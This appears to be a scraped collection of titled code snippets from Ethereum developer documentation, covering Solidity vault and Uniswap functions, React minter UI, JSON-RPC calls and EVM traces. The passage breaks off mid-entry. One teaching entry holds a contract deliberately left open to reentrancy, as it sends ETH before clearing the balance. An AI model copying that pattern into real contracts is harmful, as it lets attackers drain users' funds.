Argument-Specific Mock Return Values\nDESCRIPTION: Test case that mocks the ERC20 balanceOf function to return specific values only when called with certain arguments, providing more precise testing.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"returns false if the wallet has less than 1000001 tokens\", async () => {\n  await mockERC20.mock.balanceOf\n    .withArgs(wallet.address)\n    .returns(utils.parseEther(\"999999\"))\n  expect(await contract.check()).to.be.equal(false)\n})\n```\n\n----------------------------------------\n\nTITLE: Implementing a Constructor in Solidity\nDESCRIPTION: Example of a constructor function in Solidity that initializes the contract state when deployed. This sets the owner to the address that deployed the contract.\n\nLANGUAGE: solidity\nCODE:\n```\n// Solidity example\n// Initializes the contract's data, setting the `owner`\n// to the address of the contract creator.\nconstructor() public {\n    // All smart contracts rely on external transactions to trigger its functions.\n    // `msg` is a global variable that includes relevant data on the given transaction,\n    // such as the address of the sender and the ETH value included in the transaction.\n    // Learn more: https://solidity.readthedocs.io/en/v0.5.10/units-and-global-variables.html#block-and-transaction-properties\n    owner = msg.sender;\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Total Assets in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function returns the total amount of underlying assets held by the vault.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction totalAssets() public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Storing Product of Reserves (k) in Uniswap Pair\nDESCRIPTION: Stores the product of reserves (k value) from the constant product formula x*y=k after the most recent liquidity event. This value changes when liquidity is added or removed.\n\nLANGUAGE: solidity\nCODE:\n```\nuint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n```\n\n----------------------------------------\n\nTITLE: Building the UI Component for NFT Minter Interface\nDESCRIPTION: React JSX code that renders the NFT minting interface with a wallet connection button, form inputs for NFT metadata (asset URL, name, description), and a mint button. The component updates state variables when user inputs change.\n\nLANGUAGE: javascript\nCODE:\n```\n//the UI of our component\nreturn (\n  <div className=\"Minter\">\n    <button id=\"walletButton\" onClick={connectWalletPressed}>\n      {walletAddress.length > 0 ? (\n        \"Connected: \" +\n        String(walletAddress).substring(0, 6) +\n        \"...\" +\n        String(walletAddress).substring(38)\n      ) : (\n        <span>Connect Wallet</span>\n      )}\n    </button>\n\n    <br></br>\n    <h1 id=\"title\">🧙‍♂️ Alchemy NFT Minter</h1>\n    <p>\n      Simply add your asset's link, name, and description, then press \"Mint.\"\n    </p>\n    <form>\n      <h2>🖼 Link to asset: </h2>\n      <input\n        type=\"text\"\n        placeholder=\"e.g. https://gateway.pinata.cloud/ipfs/<hash>\"\n        onChange={(event) => setURL(event.target.value)}\n      />\n      <h2>🤔 Name: </h2>\n      <input\n        type=\"text\"\n        placeholder=\"e.g. My first NFT!\"\n        onChange={(event) => setName(event.target.value)}\n      />\n      <h2>✍️ Description: </h2>\n      <input\n        type=\"text\"\n        placeholder=\"e.g. Even cooler than cryptokitties ;)\"\n        onChange={(event) => setDescription(event.target.value)}\n      />\n    </form>\n    <button id=\"mintButton\" onClick={onMintPressed}>\n      Mint NFT\n    </button>\n    <p id=\"status\">{status}</p>\n  </div>\n)\n```\n\n----------------------------------------\n\nTITLE: Querying Account Balance in C# using Nethereum\nDESCRIPTION: Example code for querying an Ethereum account balance using Nethereum in C#. This sample demonstrates how to interact with the Ethereum blockchain to retrieve account information.\n\nLANGUAGE: C#\nCODE:\n```\n// Playground link: http://playground.nethereum.com/csharp/id/1001\n```\n\n----------------------------------------\n\nTITLE: Reward Component Weights in Ethereum Proof-of-Stake\nDESCRIPTION: Constants defining the relative weights of different validator duties when calculating rewards. These values determine how much of the base reward is allocated to each type of validator activity.\n\nLANGUAGE: solidity\nCODE:\n```\nTIMELY_SOURCE_WEIGHT\tuint64(14)\nTIMELY_TARGET_WEIGHT\tuint64(26)\nTIMELY_HEAD_WEIGHT\tuint64(14)\nSYNC_REWARD_WEIGHT\tuint64(2)\nPROPOSER_WEIGHT\tuint64(8)\n```\n\n----------------------------------------\n\nTITLE: CALLCODE Operation in EVM (F2)\nDESCRIPTION: Similar to DELEGATECALL but doesn't propagate the original msg.sender and msg.value. Executes code in the context of the current contract.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] = returndata\n```\n\n----------------------------------------\n\nTITLE: Tracking Custom CryptoKitties Events with Web3.py\nDESCRIPTION: This Python example demonstrates how to track specialized events specific to the CryptoKitties implementation of ERC-721. It shows how to filter logs for 'Pregnant' and 'Birth' events.\n\nLANGUAGE: python\nCODE:\n```\n# Using the Pregnant and Birth Events ABI to get info about new Kitties.\nck_extra_events_abi = [\n    {\n        'anonymous': False,\n        'inputs': [\n            {'indexed': False, 'name': 'owner', 'type': 'address'},\n            {'indexed': False, 'name': 'matronId', 'type': 'uint256'},\n            {'indexed': False, 'name': 'sireId', 'type': 'uint256'},\n            {'indexed': False, 'name': 'cooldownEndBlock', 'type': 'uint256'}],\n        'name': 'Pregnant',\n        'type': 'event'\n    },\n    {\n        'anonymous': False,\n        'inputs': [\n            {'indexed': False, 'name': 'owner', 'type': 'address'},\n            {'indexed': False, 'name': 'kittyId', 'type': 'uint256'},\n            {'indexed': False, 'name': 'matronId', 'type': 'uint256'},\n            {'indexed': False, 'name': 'sireId', 'type': 'uint256'},\n            {'indexed': False, 'name': 'genes', 'type': 'uint256'}],\n        'name': 'Birth',\n        'type': 'event'\n    }]\n\n# We need the event's signature to filter the logs\nck_event_signatures = [\n    w3.keccak(text=\"Pregnant(address,uint256,uint256,uint256)\").hex(),\n    w3.keccak(text=\"Birth(address,uint256,uint256,uint256,uint256)\").hex(),\n]\n\n# Here is a Pregnant Event:\n# - https://etherscan.io/tx/0xc97eb514a41004acc447ac9d0d6a27ea6da305ac8b877dff37e49db42e1f8cef#eventlog\npregnant_logs = w3.eth.get_logs({\n    \"fromBlock\": w3.eth.block_number - 120,\n    \"address\": w3.to_checksum_address(ck_token_addr),\n    \"topics\": [ck_event_signatures[0]]\n})\n\nrecent_pregnants = [get_event_data(w3.codec, ck_extra_events_abi[0], log)[\"args\"] for log in pregnant_logs]\n\n# Here is a Birth Event:\n```\n\n----------------------------------------\n\nTITLE: Roadmap Card Grid Implementation in HTML/JSX\nDESCRIPTION: A card grid component that displays the main benefits of Ethereum's roadmap including cheaper transactions, extra security, better user experience, and future proofing. Each card links to a detailed section of the roadmap.\n\nLANGUAGE: html\nCODE:\n```\n<CardGrid>\n  <RoadmapActionCard\n    href=\"/roadmap/scaling\"\n    title=\"Cheaper transactions\"\n    image=\"scaling\"\n    description=\"Rollups are too expensive and rely on centralized components, causing users to place too much trust in their operators. The roadmap includes fixes for both of these problems.\"\n    buttonText=\"More on reducing fees\"\n  />\n  <RoadmapActionCard\n    href=\"/roadmap/security\"\n    title=\"Extra security\"\n    image=\"security\"\n    description=\"Ethereum is already very secure but it can be made even stronger, ready to withstand all kinds of attack far into the future.\"\n    buttonText=\"More on security\"\n  />\n  <RoadmapActionCard\n    href=\"/roadmap/user-experience\"\n    title=\"Better user experience\"\n    image=\"userExperience\"\n    description=\"More support for smart contract wallets and light-weight nodes will make using Ethereum simpler and safer.\"\n    buttonText=\"More on user experience\"\n  />\n  <RoadmapActionCard\n    href=\"/roadmap/future-proofing\"\n    title=\"Future proofing\"\n    image=\"futureProofing\"\n    description=\"Ethereum researchers and developers are solving tomorrow's problems today, readying the network for future generations.\"\n    buttonText=\"More on future proofing\"\n  />\n</CardGrid>\n```\n\n----------------------------------------\n\nTITLE: Calculating Block Operation Limit in Ethereum\nDESCRIPTION: Code that calculates the operation limit for a block based on the parent block's limit and operation count. It uses an exponential moving average to adjust the limit over time.\n\nLANGUAGE: javascript\nCODE:\n```\nblk.oplimit = floor((blk.parent.oplimit * (EMAFACTOR - 1) +\nfloor(parent.opcount * BLK\\_LIMIT\\_FACTOR)) / EMA\\_FACTOR)\n```\n\n----------------------------------------\n\nTITLE: Retrieving Contract Deployment Receipt via JSON-RPC\nDESCRIPTION: Curl command that calls eth_getTransactionReceipt to get information about the deployment transaction, including the newly created contract address.\n\nLANGUAGE: bash\nCODE:\n```\ncurl --data '{\"jsonrpc\":\"2.0\",\"method\": \"eth_getTransactionReceipt\", \"params\": [\"0xe1f3095770633ab2b18081658bad475439f6a08c902d0915903bafff06e6febf\"], \"id\": 7}' -H \"Content-Type: application/json\" localhost:8545\n{\"jsonrpc\":\"2.0\",\"id\":7,\"result\":{\"blockHash\":\"0x77b1a4f6872b9066312de3744f60020cbd8102af68b1f6512a05b7619d527a4f\",\"blockNumber\":\"0x1\",\"contractAddress\":\"0x4d03d617d700cf81935d7f797f4e2ae719648262\",\"cumulativeGasUsed\":\"0x1c31e\",\"from\":\"0x9b1d35635cc34752ca54713bb99d38614f63c955\",\"gasUsed\":\"0x1c31e\",\"logs\":[],\"logsBloom\":\"0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\",\"status\":\"0x1\",\"to\":null,\"transactionHash\":\"0xe1f3095770633ab2b18081658bad475439f6a08c902d0915903bafff06e6febf\",\"transactionIndex\":\"0x0\"}}\n```\n\n----------------------------------------\n\nTITLE: Previewing Deposit Effects in ERC-4626 Vaults in Solidity\nDESCRIPTION: This function allows users to simulate the effects of their deposit in the current block.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction previewDeposit(uint256 assets) public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Implementing Core Functions for NFT Minter in React\nDESCRIPTION: Three core async functions for the NFT minter: useEffect for initialization, connectWalletPressed to connect user's wallet, and onMintPressed to mint the NFT.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  //TODO: implement\n}, [])\n\nconst connectWalletPressed = async () => {\n  //TODO: implement\n}\n\nconst onMintPressed = async () => {\n  //TODO: implement\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Core Functions for NFT Minter in React\nDESCRIPTION: Three core async functions for the NFT minter: useEffect for initialization, connectWalletPressed to connect user's wallet, and onMintPressed to mint the NFT.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  //TODO: implement\n}, [])\n\nconst connectWalletPressed = async () => {\n  //TODO: implement\n}\n\nconst onMintPressed = async () => {\n  //TODO: implement\n}\n```\n\n----------------------------------------\n\nTITLE: Smart Contract for Gas Testing with Push/Pop Operations\nDESCRIPTION: A Solidity contract example with array operations that demonstrates different gas consumption patterns.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  address [] addrs;\n  function push(address a) public {\n    addrs.push(a);\n  }\n  function pop() public {\n    addrs.pop();\n  }\n  function clear() public{\n    addrs.length = 0;\n  }\n  function check() public{\n    for(uint256 i = 0; i < addrs.length; i++)\n      for(uint256 j = i+1; j < addrs.length; j++)\n        if (addrs[i] == addrs[j])\n          addrs[j] = address(0x0);\n  }\n  function echidna_test() public returns (bool) {\n      return true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Storing Updated ETH Value and Finishing Transaction\nDESCRIPTION: This final code snippet at offset 0x75 completes the ETH transfer handling by storing the updated value in Storage[6] and closing the transaction successfully with STOP.\n\nLANGUAGE: EVM bytecode\nCODE:\n```\n75 | JUMPDEST           | Value*+CALLVALUE 0 6 CALLVALUE \n76 | SWAP1              | 0 Value*+CALLVALUE 6 CALLVALUE \n77 | SWAP2              | 6 Value*+CALLVALUE 0 CALLVALUE \n78 | SSTORE             | 0 CALLVALUE                       \n79 | POP                |\n7A | POP                |\n7B | STOP               |\n```\n\n----------------------------------------\n\nTITLE: Running Besu Interactive Launcher\nDESCRIPTION: Command to start Besu's interactive launcher which guides users through configuration setup with a series of questions to generate a configuration file.\n\nLANGUAGE: sh\nCODE:\n```\nbesu --Xlauncher\n```\n\n----------------------------------------\n\nTITLE: Displaying Constantinople EIPs in an Expandable Card Component\nDESCRIPTION: A React component that displays Constantinople Ethereum Improvement Proposals (EIPs) in an expandable card format. The component includes a preview of content and a list of EIPs with their descriptions.\n\nLANGUAGE: jsx\nCODE:\n```\n<ExpandableCard title=\"Constantinople-EIPs\" contentPreview=\"Official improvements included in this fork.\">\n\n<ul>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-145\">EIP-145</a> – <em>optimiert die Kosten von bestimmten On-Chain-Aktionen.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-1014\">EIP-1014</a> – <em>erlaubt es Ihnen, Adressen zu verwenden, die noch nicht angelegt wurden.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-1052\">EIP-1052</a> – <em>optimiert die Kosten bestimmter On-Chain-Aktionen.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-1234\">EIP-1234</a> – <em>stellt sicher, dass die Blockchain vor dem Proof-of-Stake-Verfahren nicht eingefroren wird.</em></li>\n</ul>\n\n</ExpandableCard>\n```\n\n----------------------------------------\n\nTITLE: Starting Development Server with Yarn\nDESCRIPTION: Command to start the local development server. This allows you to see your changes in real-time at localhost:3000.\n\nLANGUAGE: shell\nCODE:\n```\nyarn dev\n```\n\n----------------------------------------\n\nTITLE: Handling ETH Transfers from WETH Contract in Uniswap Router\nDESCRIPTION: Implements a receive function that only accepts ETH from the WETH contract. This is used when unwrapping WETH back to ETH and ensures no other contract can send ETH directly to the router.\n\nLANGUAGE: solidity\nCODE:\n```\n    receive() external payable {\n        assert(msg.sender == WETH); // only accept ETH via fallback from the WETH contract\n    }\n```\n\n----------------------------------------\n\nTITLE: Subscribing to New Block Headers in Ethereum using newHeads\nDESCRIPTION: Shows how to subscribe to newHeads events that emit data whenever a new block header is added to the blockchain. This subscription also handles chain reorganizations by emitting new headers for the reorganized chain.\n\nLANGUAGE: json\nCODE:\n```\n>  {\"jsonrpc\":  \"2.0\",  \"id\":  1,  \"method\":  \"eth_subscribe\",  \"params\":  [\"newHeads\"]}\n\n<  {\"jsonrpc\":\"2.0\",\"id\":2,\"result\":\"0x9ce59a13059e417087c02d3236a0b1cc\"}\n<  {\n  \"jsonrpc\":  \"2.0\",\n  \"method\":  \"eth_subscription\",\n  \"params\":  {\n      \"result\":  {\n          \"extraData\":  \"0xd983010305844765746887676f312e342e328777696e646f7773\",\n          \"gasLimit\":  \"0x47e7c4\",\n          \"gasUsed\":  \"0x38658\",\n          \"logsBloom\":\n\"0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\",\n          \"nonce\":  \"0x084149998194cc5f\",\n          \"number\":  \"0x1348c9\",\n          \"parentHash\":  \"0x7736fab79e05dc611604d22470dadad26f56fe494421b5b333de816ce1f25701\",\n          \"receiptRoot\":  \"0x2fab35823ad00c7bb388595cb46652fe7886e00660a01e867824d3dceb1c8d36\",\n          \"sha3Uncles\":  \"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347\",\n          \"stateRoot\":  \"0xb3346685172db67de536d8765c43c31009d0eb3bd9c501c9be3229203f15f378\",\n          \"timestamp\":  \"0x56ffeff8\",\n          \"transactionsRoot\":  \"0x0167ffa60e3ebc0b080cdb95f7c0087dd6c0e61413140e39d94d3468d7c9689f\"\n      },\n  \"subscription\":  \"0x9ce59a13059e417087c02d3236a0b1cc\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de eth_protocolVersion en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour obtenir la version actuelle du protocole Ethereum en utilisant la méthode eth_protocolVersion. Cette méthode n'est pas disponible dans Geth.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_protocolVersion\",\"params\":[],\"id\":67}'\n// Result\n{\n  \"id\":67,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"54\"\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Shares to Assets in ERC-4626 Vaults in Solidity\nDESCRIPTION: This function returns the amount of assets that would be exchanged by the vault for the given amount of shares.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction convertToAssets(uint256 shares) public view returns (uint256 assets)\n```\n\n----------------------------------------\n\nTITLE: Calculating Daily Ethereum Blocks Formula\nDESCRIPTION: A series of calculations to determine the total number of Ethereum blocks produced in a day based on a 12-second block time, resulting in 7200 blocks per day.\n\nLANGUAGE: markdown\nCODE:\n```\n- `(1 blok / 12 detik) * (60 detik/menit) = 5 blok/menit`\n- `(5 blok/menit) * (60 menit/jam) = 300 blok/jam`\n- `(300 blok/jam) * (24 jam/hari) = 7200 blok/hari`\n```\n\n----------------------------------------\n\nTITLE: Example Output of Contract Interaction\nDESCRIPTION: Sample console output showing the initial message, update process, and the new message after successful contract interaction.\n\nLANGUAGE: bash\nCODE:\n```\nThe message is: Hello World!\nUpdating the message...\nThe new message is: This is the new message.\n```\n\n----------------------------------------\n\nTITLE: Example Output of Contract Interaction\nDESCRIPTION: Sample console output showing the initial message, update process, and the new message after successful contract interaction.\n\nLANGUAGE: bash\nCODE:\n```\nThe message is: Hello World!\nUpdating the message...\nThe new message is: This is the new message.\n```\n\n----------------------------------------\n\nTITLE: Example Output of Contract Interaction\nDESCRIPTION: Sample console output showing the initial message, update process, and the new message after successful contract interaction.\n\nLANGUAGE: bash\nCODE:\n```\nThe message is: Hello World!\nUpdating the message...\nThe new message is: This is the new message.\n```\n\n----------------------------------------\n\nTITLE: Defining Cache Size Configuration for Ethereum\nDESCRIPTION: A list of cache size values in bytes, likely used for memory management or optimization in the Ethereum project. These values appear to be incrementally increasing memory allocation sizes.\n\nLANGUAGE: python\nCODE:\n```\ncache_sizes = [\n16776896, 16907456, 17039296, 17170112, 17301056, 17432512, 17563072,\n17693888, 17824192, 17955904, 18087488, 18218176, 18349504, 18481088,\n18611392, 18742336, 18874304, 19004224, 19135936, 19267264, 19398208,\n19529408, 19660096, 19791424, 19922752, 20053952, 20184896, 20315968,\n20446912, 20576576, 20709184, 20840384, 20971072, 21102272, 21233216,\n21364544, 21494848, 21626816, 21757376, 21887552, 22019392, 22151104,\n22281536, 22412224, 22543936, 22675264, 22806464, 22935872, 23068096,\n23198272, 23330752, 23459008, 23592512, 23723968, 23854912, 23986112,\n24116672, 24247616, 24378688, 24509504, 24640832, 24772544, 24903488,\n25034432, 25165376, 25296704, 25427392, 25558592, 25690048, 25820096,\n25951936, 26081728, 26214208, 26345024, 26476096, 26606656, 26737472,\n26869184, 26998208, 27131584, 27262528, 27393728, 27523904, 27655744,\n27786688, 27917888, 28049344, 28179904, 28311488, 28441792, 28573504,\n28700864, 28835648, 28966208, 29096768, 29228608, 29359808, 29490752,\n29621824, 29752256, 29882816, 30014912, 30144448, 30273728, 30406976,\n30538432, 30670784, 30799936, 30932672, 31063744, 31195072, 31325248,\n31456192, 31588288, 31719232, 31850432, 31981504, 32110784, 32243392,\n32372672, 32505664, 32636608, 32767808, 32897344, 33029824, 33160768,\n33289664, 33423296, 33554368, 33683648, 33816512, 33947456, 34076992,\n34208704, 34340032, 34471744, 34600256, 34734016, 34864576, 34993984,\n35127104, 35258176, 35386688, 35518528, 35650624, 35782336, 35910976,\n36044608, 36175808, 36305728, 36436672, 36568384, 36699968, 36830656,\n36961984, 37093312, 37223488, 37355072, 37486528, 37617472, 37747904,\n37879232, 38009792, 38141888, 38272448, 38403392, 38535104, 38660672,\n38795584, 38925632, 39059264, 39190336, 39320768, 39452096, 39581632,\n39713984, 39844928, 39974848, 40107968, 40238144, 40367168, 40500032,\n40631744, 40762816, 40894144, 41023552, 41155904, 41286208, 41418304,\n41547712, 41680448, 41811904, 41942848, 42073792, 42204992, 42334912,\n42467008, 42597824, 42729152, 42860096, 42991552, 43122368, 43253696,\n43382848, 43515712, 43646912, 43777088, 43907648, 44039104, 44170432,\n44302144, 44433344, 44564288, 44694976, 44825152, 44956864, 45088448,\n45219008, 45350464, 45481024, 45612608, 45744064, 45874496, 46006208,\n46136768, 46267712, 46399424, 46529344, 46660672, 46791488, 46923328,\n47053504, 47185856, 47316928, 47447872, 47579072, 47710144, 47839936,\n47971648, 48103232, 48234176, 48365248, 48496192, 48627136, 48757312,\n48889664, 49020736, 49149248, 49283008, 49413824, 49545152, 49675712,\n49807168, 49938368, 50069056, 50200256, 50331584, 50462656, 50593472,\n50724032, 50853952, 50986048, 51117632, 51248576, 51379904, 51510848,\n51641792, 51773248, 51903296, 52035136, 52164032, 52297664, 52427968,\n52557376, 52690112, 52821952, 52952896, 53081536, 53213504, 53344576,\n53475776, 53608384, 53738816, 53870528, 54000832, 54131776, 54263744,\n54394688, 54525248, 54655936, 54787904, 54918592, 55049152, 55181248,\n55312064, 55442752, 55574336, 55705024, 55836224, 55967168, 56097856,\n56228672, 56358592, 56490176, 56621888, 56753728, 56884928, 57015488,\n57146816, 57278272, 57409216, 57540416, 57671104, 57802432, 57933632,\n58064576, 58195264, 58326976, 58457408, 58588864, 58720192, 58849984,\n58981696, 59113024, 59243456, 59375552, 59506624, 59637568, 59768512,\n59897792, 60030016, 60161984, 60293056, 60423872, 60554432, 60683968,\n60817216, 60948032, 61079488, 61209664, 61341376, 61471936, 61602752,\n61733696, 61865792, 61996736, 62127808, 62259136, 62389568, 62520512,\n62651584, 62781632, 62910784, 63045056, 63176128, 63307072, 63438656,\n63569216, 63700928, 63831616, 63960896, 64093888, 64225088, 64355392,\n64486976, 64617664, 64748608, 64879424, 65009216, 65142464, 65273792,\n65402816, 65535424, 65666752, 65797696, 65927744, 66060224, 66191296,\n66321344, 66453056, 66584384, 66715328, 66846656, 66977728, 67108672,\n67239104, 67370432, 67501888, 67631296, 67763776, 67895104, 68026304,\n68157248, 68287936, 68419264, 68548288, 68681408, 68811968, 68942912,\n```\n\n----------------------------------------\n\nTITLE: Creating React Components with Hooks\nDESCRIPTION: Demonstrates the project convention of using functional components with React hooks instead of class-based components, showing useState and useEffect implementation.\n\nLANGUAGE: tsx\nCODE:\n```\n// Example\nimport React, { useState, useEffect } from \"react\"\n\nconst ComponentName = () => {\n  // useState hook for managing state variables\n  const [greeting, setGreeting] = useState(\"\")\n\n  useEffect(() => {\n    // useEffect hook for handling component lifecycle\n    setGreeting(\"Hello world\")\n  }, [])\n\n  return <div>{greeting}</div>\n}\n\nexport default ComponentName\n```\n\n----------------------------------------\n\nTITLE: Converting Assets to Shares in ERC-4626 Vault\nDESCRIPTION: This method calculates how many shares would be exchanged for a given amount of assets provided to the vault.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction convertToShares(uint256 assets) public view returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Reading Current Greeting from Blockchain\nDESCRIPTION: Uses Wagmi's useContractRead hook to fetch the current greeting from the smart contract, with the watch flag enabled to keep the data updated when it changes on the blockchain.\n\nLANGUAGE: tsx\nCODE:\n```\n  const readResults = useContractRead({\n    address: greeterAddr,\n    abi: greeterABI,\n    functionName: \"greet\" , // No arguments\n    watch: true    \n  })\n```\n\n----------------------------------------\n\nTITLE: Swap Exact ETH for Tokens with Fee Support in Uniswap V2\nDESCRIPTION: External function that allows swapping a fixed amount of ETH for a minimum amount of output tokens, supporting tokens with transfer fees. It wraps ETH to WETH, transfers to the pair, and performs the swap using the fee-supporting function.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint amountOutMin,\n    address[] calldata path,\n    address to,\n    uint deadline\n)\n    external\n    virtual\n    override\n    payable\n    ensure(deadline)\n{\n    require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n    uint amountIn = msg.value;\n    IWETH(WETH).deposit{value: amountIn}();\n    assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn));\n    uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n    _swapSupportingFeeOnTransferTokens(path, to);\n    require(\n        IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n        'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Swap Exact ETH for Tokens with Fee Support in Uniswap V2\nDESCRIPTION: External function that allows swapping a fixed amount of ETH for a minimum amount of output tokens, supporting tokens with transfer fees. It wraps ETH to WETH, transfers to the pair, and performs the swap using the fee-supporting function.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint amountOutMin,\n    address[] calldata path,\n    address to,\n    uint deadline\n)\n    external\n    virtual\n    override\n    payable\n    ensure(deadline)\n{\n    require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n    uint amountIn = msg.value;\n    IWETH(WETH).deposit{value: amountIn}();\n    assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn));\n    uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n    _swapSupportingFeeOnTransferTokens(path, to);\n    require(\n        IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n        'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing SHA3 Hashing Functions for Dagger-Hashimoto\nDESCRIPTION: Implementation of SHA3 and double-SHA3 hashing functions that handle both integer and string inputs. These functions convert integers to strings before hashing if needed and return the result as integers.\n\nLANGUAGE: python\nCODE:\n```\nfrom pyethereum import utils\ndef sha3(x):\n    if isinstance(x, (int, long)):\n        x = encode_int(x)\n    return decode_int(utils.sha3(x))\n\ndef dbl_sha3(x):\n    if isinstance(x, (int, long)):\n        x = encode_int(x)\n    return decode_int(utils.sha3(utils.sha3(x)))\n```\n\n----------------------------------------\n\nTITLE: Updating State in an Ethereum Smart Contract\nDESCRIPTION: JavaScript code that updates the message stored in a HelloWorld smart contract. The function calls the contract's update method, waits for the transaction to be mined, and then reads the updated message.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// ...\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"This is the new message.\")\n  await tx.wait()\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Transfer Address and Data Parameters for Bridge Events\nDESCRIPTION: Specifies the from/to addresses, amount, and optional data parameters for bridge transfer events. The data field allows adding notes to transfers that are included in the event logs.\n\nLANGUAGE: solidity\nCODE:\n```\n        address indexed _from,\n        address _to,\n        uint256 _amount,\n        bytes _data\n    );\n```\n\n----------------------------------------\n\nTITLE: Visual Component for Section Dividers\nDESCRIPTION: A JSX component used to create visual separation between sections of the Web3 documentation.\n\nLANGUAGE: jsx\nCODE:\n```\n<Divider />\n```\n\n----------------------------------------\n\nTITLE: Calculating Daily Ethereum Blocks\nDESCRIPTION: A mathematical calculation of how many blocks are produced in Ethereum per day, based on a 12-second block time. This is a prerequisite for determining gas requirements for deflation.\n\nLANGUAGE: math\nCODE:\n```\n(1 block / 12 seconds) * (60 seconds/minute) = 5 blocks/minute\n(5 blocks/minute) * (60 minutes/hour) = 300 blocks/hour\n(300 blocks/hour) * (24 hours/day) = 7200 blocks/day\n```\n\n----------------------------------------\n\nTITLE: Reading Values from Calldata in Solidity\nDESCRIPTION: A utility function to extract arbitrary length values from calldata, using assembly for direct memory access.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _calldataVal(uint startByte, uint length)\n    private pure returns (uint)\n{\n    uint _retVal;\n\n    require(length < 0x21,\n        \"_calldataVal length limit is 32 bytes\");\n    require(length + startByte <= msg.data.length,\n        \"_calldataVal trying to read beyond calldatasize\");\n    assembly {\n        _retVal := calldataload(startByte)\n    }\n    _retVal = _retVal >> (256-length*8);\n    return _retVal;\n} // _calldataVal\n```\n\n----------------------------------------\n\nTITLE: Implementing SHA3 Hashing Functions for Dagger-Hashimoto\nDESCRIPTION: Implementation of SHA3 and double-SHA3 hashing functions that handle both integer and string inputs. These functions convert integers to strings before hashing if needed and return the result as integers.\n\nLANGUAGE: python\nCODE:\n```\nfrom pyethereum import utils\ndef sha3(x):\n    if isinstance(x, (int, long)):\n        x = encode_int(x)\n    return decode_int(utils.sha3(x))\n\ndef dbl_sha3(x):\n    if isinstance(x, (int, long)):\n        x = encode_int(x)\n    return decode_int(utils.sha3(utils.sha3(x)))\n```\n\n----------------------------------------\n\nTITLE: Implementace zranitelného kontraktu náchylného k reentrancy útoku v Solidity\nDESCRIPTION: Ukázkový smart kontrakt Victim demonstrující zranitelnost vůči reentrancy útoku. Kontrakt umožňuje uživatelům vkládat a vybírat ETH, ale neaktualizuje zůstatky před odesláním prostředků, což umožňuje útočníkovi opakovaně vstoupit do withdraw funkce.\n\nLANGUAGE: solidity\nCODE:\n```\n// This contract is vulnerable. Do not use in production\n\ncontract Victim {\n    mapping (address => uint256) public balances;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        (bool success, ) = msg.sender.call.value(amount)(\"\");\n        require(success);\n        balances[msg.sender] = 0;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Quiz Widget Implementation for Ethereum Scaling Content\nDESCRIPTION: A component that embeds an interactive quiz about Ethereum scaling concepts. The widget references a quiz with the key 'scaling' that likely tests understanding of the concepts presented in the document.\n\nLANGUAGE: 